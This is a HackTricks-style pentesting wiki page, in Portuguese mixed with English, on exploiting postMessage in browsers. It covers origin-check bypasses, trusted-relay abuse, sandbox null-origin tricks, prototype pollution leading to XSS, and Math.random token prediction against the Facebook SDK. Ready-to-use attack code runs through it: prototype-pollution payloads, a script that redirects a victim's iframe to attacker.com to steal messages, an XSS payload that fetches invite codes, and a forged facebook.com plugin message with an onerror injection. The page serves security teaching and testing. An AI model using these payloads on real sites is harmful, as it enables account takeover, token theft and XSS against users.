# PostMessage Vulnerabilidades

{{#include ../../banners/hacktricks-training.md}}

## Enviar **PostMessage**

**PostMessage** usa a seguinte função para enviar uma mensagem:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note que **targetOrigin** pode ser um '\*' ou uma URL like _https://company.com._\
No **segundo cenário**, a **mensagem só pode ser enviada para esse domínio** (mesmo que a origem do window object seja diferente).\
Se o **wildcard** for usado, **mensagens poderão ser enviadas para qualquer domínio**, e serão enviadas para a origem do Window object.

### Atacando iframe & wildcard em **targetOrigin**

Como explicado em [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) se você encontrar uma página que possa ser **iframed** (sem proteção `X-Frame-Header`) e que esteja enviando mensagens sensíveis via **postMessage** usando um **wildcard** (\*), você pode modificar a origem do **iframe** e **leak** a mensagem sensível para um domínio controlado por você.\
Note que se a página pode ser iframed mas o **targetOrigin** está **definido para uma URL e não para um wildcard**, esse **truque não funcionará**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Exploração de `addEventListener`

**`addEventListener`** é a função usada pelo JS para declarar a função que está **esperando `postMessages`**.\
Um código similar ao seguinte será usado:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **Procurar** no código JS por `window.addEventListener` e `$(window).on` (_JQuery version_)
- **Executar** no console das developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Ir para** _Elements --> Event Listeners_ nas developer tools do navegador

![](<../../images/image (396).png>)

- Use uma **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Essas browser extensions irão **interceptar all the messages** e mostrá-las para você.

### Origin check bypasses

- **`event.isTrusted`** attribute is considered secure as it returns `True` only for events that are generated by genuine user actions. Though it's challenging to bypass if implemented correctly, its significance in security checks is notable.
- O uso de **`indexOf()`** para validação de origem em eventos PostMessage pode ser suscetível a bypass. Um exemplo ilustrando essa vulnerabilidade é:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- O método **`search()`** de `String.prototype.search()` é destinado a expressões regulares, não strings. Passar qualquer coisa que não seja um regexp leva a conversão implícita para regex, tornando o método potencialmente inseguro. Isso porque em regex, um ponto (.) atua como coringa, permitindo contornos da validação com domínios especialmente construídos. Por exemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- A função **`match()`**, similar ao `search()`, processa regex. Se a regex estiver mal estruturada, ela pode ser propensa a bypass.
- A função **`escapeHtml`** destina-se a sanitizar entradas escapando caracteres. Entretanto, ela não cria um novo objeto escapado, mas sobrescreve as propriedades do objeto existente. Esse comportamento pode ser explorado. Particularmente, se um objeto puder ser manipulado de forma que sua propriedade controlada não reconheça `hasOwnProperty`, o `escapeHtml` não funcionará como esperado. Isso é demonstrado nos exemplos abaixo:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

No contexto desta vulnerabilidade, o objeto `File` é notavelmente explorável devido à sua propriedade somente-leitura `name`. Essa propriedade, quando usada em templates, não é sanitizada pela função `escapeHtml`, levando a potenciais riscos de segurança.

- A propriedade `document.domain` em JavaScript pode ser definida por um script para encurtar o domínio, permitindo uma aplicação mais relaxada da same-origin policy dentro do mesmo domínio pai.

### Origin-only trust + trusted relays

Se um receptor apenas verifica **`event.origin`** (por exemplo, confia em qualquer `*.trusted.com`) você frequentemente pode encontrar uma página **"relay"** nessa origem que ecoa parâmetros controlados pelo atacante via `postMessage` para um `targetOrigin`/`targetWindow` fornecido. Exemplos incluem gadgets de marketing/analytics que pegam query params e encaminham `{msg_type, access_token, ...}` para `opener`/`parent`. Você pode:

- **Abrir a página da vítima em um popup/iframe que tenha um `opener`** para que seus handlers se registrem (muitos pixels/SDKs só anexam listeners quando `window.opener` existe).
- **Navegar outra janela do atacante para o endpoint relay na origem confiável**, preenchendo os campos de mensagem que você quer injetar (message type, tokens, nonces).
- Como a mensagem agora vem **da origem confiável**, a validação apenas por origem passa e você pode acionar comportamentos privilegiados (mudanças de estado, chamadas de API, gravações no DOM) no listener da vítima.

Padrões de abuso observados na prática:

- Analytics SDKs (e.g., pixel/fbevents-style) consomem mensagens como `FACEBOOK_IWL_BOOTSTRAP`, então **chamam backend APIs usando um token fornecido na mensagem** e incluem **`location.href` / `document.referrer`** no corpo da requisição. Se você fornecer seu próprio token, pode **ler essas requisições no histórico/logs de requisições do token** e exfiltrar **OAuth codes/tokens** presentes na URL/referrer da página da vítima.
- Qualquer relay que reflita campos arbitrários para `postMessage` permite que você **spoof message types** esperados por listeners privilegiados. Combine com validação fraca de entrada para atingir chamadas Graph/REST, desbloqueios de recursos, ou fluxos equivalentes a CSRF.

Dicas de busca: enumere listeners de `postMessage` que só verificam `event.origin`, depois procure por **endpoints HTML/JS same-origin que encaminhem params da URL via `postMessage`** (marketing previews, popups de login, páginas de erro OAuth). Una ambos com `window.open()` + `postMessage` para burlar verificações de origem.

### e.origin == window.origin bypass

Ao embutir uma página web dentro de um **sandboxed iframe** usando %%%%%%, é crucial entender que a origem do iframe será definida como null. Isso é particularmente importante quando se lida com **sandbox attributes** e suas implicações na segurança e na funcionalidade.

Ao especificar **`allow-popups`** no atributo sandbox, qualquer popup aberto de dentro do iframe herda as restrições de sandbox do pai. Isso significa que, a menos que o atributo **`allow-popups-to-escape-sandbox`** também seja incluído, a origem do popup será igualmente definida como `null`, alinhando-se com a origem do iframe.

Consequentemente, quando um popup é aberto sob essas condições e uma mensagem é enviada do iframe para o popup usando **`postMessage`**, tanto o emissor quanto o receptor têm suas origens definidas como `null`. Essa situação leva a um cenário onde **`e.origin == window.origin`** avalia para true (`null == null`), porque tanto o iframe quanto o popup compartilham o mesmo valor de origem `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Você pode forçar **`e.source`** de uma mensagem a ser nulo criando um **iframe** que **envia** o **postMessage** e é **imediatamente excluído**.

Para mais informações **leia:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Para realizar esses ataques, idealmente você poderá **colocar a página web da vítima** dentro de um `iframe`. Mas alguns headers como `X-Frame-Header` podem **impedir** esse **comportamento**.\
Nesses cenários você ainda pode usar um ataque menos furtivo. Você pode abrir uma nova aba para a aplicação web vulnerável e comunicar-se com ela:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Roubando mensagem enviada ao iframe filho bloqueando a página principal

Na página a seguir você pode ver como é possível roubar **dados postmessage sensíveis** enviados a um **iframe filho** ao **bloquear** a **página principal** antes de enviar os dados e abusar de um **XSS no iframe filho** para **leak the data** antes de ser recebido:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Roubando mensagem modificando a localização do iframe

Se você conseguir inserir uma página web em um iframe sem X-Frame-Header que contenha outro iframe, você pode **alterar a localização desse iframe filho**, então se ele estiver recebendo um **postmessage** enviado usando um **wildcard**, um atacante poderia **mudar** o **origin** desse iframe para uma página **controlada** por ele e **roubar** a mensagem:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage para Prototype Pollution e/ou XSS

Em cenários onde os dados enviados via `postMessage` são executados pelo JS, você pode carregar a **página** em um iframe e **exploit the prototype pollution/XSS** enviando o exploit via `postMessage`.

Alguns **XSS muito bem explicados via `postMessage`** podem ser encontrados em [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Exemplo de um exploit para abusar de **Prototype Pollution e depois XSS** através de um `postMessage` para um `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Para **mais informações**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Prevendo os tokens de callback de **`Math.random()`** em postMessage bridges

Quando a validação de mensagens usa um “shared secret” gerado com `Math.random()` (ex., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) e o mesmo helper também nomeia plugin iframes, você pode recuperar saídas do PRNG e forjar mensagens confiáveis:

- **Leak PRNG outputs via `window.name`:** The SDK auto-names plugin iframes with `guid()`. Se você controla o top frame, coloque a página vítima em um iframe, então navegue o plugin iframe para sua origem (ex., `window.frames[0].frames[0].location='https://attacker.com'`) e leia `window.frames[0].frames[0].name` para obter uma saída bruta de `Math.random()`.
- **Force more outputs without reloads:** Alguns SDKs expõem uma rota de reinit; no FB SDK, disparar `init:post` com `{xfbml:1}` força `XFBML.parse()`, destrói/rec cria o plugin iframe, e gera novos nomes/IDs de callback. Reinit repetido produz tantas saídas de PRNG quanto necessário (note chamadas internas extras de `Math.random()` para IDs de callback/iframe, então é preciso pular valores intervenientes).
- **Trusted-origin delivery via parameter pollution:** Se um endpoint de plugin first-party reflete um parâmetro não sanitizado no payload cross-window (ex., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), você pode injetar `&type=...&iconSVG=...` preservando a origem confiável `facebook.com`.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` e alimente vários valores (mesmo não consecutivos) em um preditor V8 `Math.random` (ex., baseado em Z3). Gere o próximo `guid()` localmente para forjar o token de callback esperado.
- **Trigger the sink:** Faça o craft dos dados de postMessage para que a bridge dispare `xd.mpn.setupIconIframe` e injete HTML em `iconSVG` (ex., URL-encoded `<img src=x onerror=...>`), alcançando DOM XSS dentro da origem hospedeira; a partir daí, iframes de mesma origem (OAuth dialogs, arbiters, etc.) podem ser lidos.
- **Framing quirks help:** A cadeia requer framing. Em alguns webviews móveis, `X-Frame-Options` pode degradar para `ALLOW-FROM` não suportado quando `frame-ancestors` está presente, e parâmetros “compat” podem forçar `frame-ancestors` permissivos, habilitando o `window.name` side channel.

#### Exemplo mínimo de mensagem forjada
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referências

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Para praticar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
